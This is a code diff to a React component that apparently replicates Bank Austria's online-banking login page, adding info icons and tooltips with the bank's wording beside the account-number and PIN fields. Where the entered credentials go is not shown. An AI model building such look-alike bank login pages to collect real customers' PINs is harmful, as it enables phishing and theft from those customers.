@@ -22,6 +22,7 @@ import iconSicherheitscenter from "@/assets/sicherheitscenter.png";
 import iconHotline from "@/assets/internetbanking_hotline.png";
 import iconFaq from "@/assets/faq.png";
 import iconCookie from "@/assets/cookie_policy.png";
+import infoIcon from "@/assets/info-icon.jpeg";
 
 const navItems = [
   { label: "Privatkunden", icon: iconPrivatkunden },
@@ -44,6 +45,7 @@ const BankAustria = () => {
   const [pin, setPin] = useState("");
   const [activeLang, setActiveLang] = useState<"de" | "en">("de");
   const [sidebarOpen, setSidebarOpen] = useState(false);
+  const [showTooltip, setShowTooltip] = useState<"verfueger" | "pin" | null>(null);
 
   return (
     <div
@@ -133,25 +135,57 @@ const BankAustria = () => {
           {/* Login Form */}
           <div className="max-w-md mx-auto">
             <div className="mb-4">
-              <input
-                type="text"
-                value={verfueger}
-                onChange={(e) => setVerfueger(e.target.value)}
-                placeholder="Verfügernummer"
-                className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
-style={{ border: "1px solid #ccc" }}
-              />
+              <div className="flex items-center gap-2">
+                <input
+                  type="text"
+                  value={verfueger}
+                  onChange={(e) => setVerfueger(e.target.value)}
+                  placeholder="Verfügernummer"
+                  className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
+                  style={{ border: "1px solid #ccc" }}
+                />
+                <div
+                  className="relative flex-shrink-0"
+                  onMouseEnter={() => setShowTooltip("verfueger")}
+                  onMouseLeave={() => setShowTooltip(null)}
+                  onClick={() => setShowTooltip(showTooltip === "verfueger" ? null : "verfueger")}
+                >
+                  <img src={infoIcon} alt="Info" className="h-6 w-6 cursor-pointer" />
+                  {showTooltip === "verfueger" && (
+                    <div className="absolute right-0 bottom-full mb-3 w-[280px] bg-white p-3 rounded shadow-lg text-sm z-50" style={{ color: "#333" }}>
+                      Die Verfügernummer ist eine von zwei notwendigen Komponenten für den Login. Sie ist eine Kombination aus bis zu 8 Ziffern.
+                      <div className="absolute right-2 top-full w-0 h-0" style={{ borderLeft: "8px solid transparent", borderRight: "8px solid transparent", borderTop: "8px solid white" }} />
+                    </div>
+                  )}
+                </div>
+              </div>
             </div>
 
             <div className="mb-4">
-              <input
-                type="password"
-                value={pin}
-                onChange={(e) => setPin(e.target.value)}
-                placeholder="PIN"
-                className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
-                style={{ border: "1px solid #ccc" }}
-              />
+              <div className="flex items-center gap-2">
+                <input
+                  type="password"
+                  value={pin}
+                  onChange={(e) => setPin(e.target.value)}
+                  placeholder="PIN"
+                  className="w-full px-4 py-3 text-base outline-none rounded-sm text-center"
+                  style={{ border: "1px solid #ccc" }}
+                />
+                <div
+                  className="relative flex-shrink-0"
+                  onMouseEnter={() => setShowTooltip("pin")}
+                  onMouseLeave={() => setShowTooltip(null)}
+                  onClick={() => setShowTooltip(showTooltip === "pin" ? null : "pin")}
+                >
+                  <img src={infoIcon} alt="Info" className="h-6 w-6 cursor-pointer" />
+                  {showTooltip === "pin" && (
+                    <div className="absolute right-0 bottom-full mb-3 w-[280px] bg-white p-3 rounded shadow-lg text-sm z-50" style={{ color: "#333" }}>
+                      Die PIN ist die zweite für den Login notwendige Komponente. Die initiale PIN wird von der Bank Austria definiert und kann von Ihnen, nach dem ersten Login, geändert werden.
+                      <div className="absolute right-2 top-full w-0 h-0" style={{ borderLeft: "8px solid transparent", borderRight: "8px solid transparent", borderTop: "8px solid white" }} />
+                    </div>
+                  )}
+                </div>
+              </div>
             </div>
 
             <div className="mb-4">
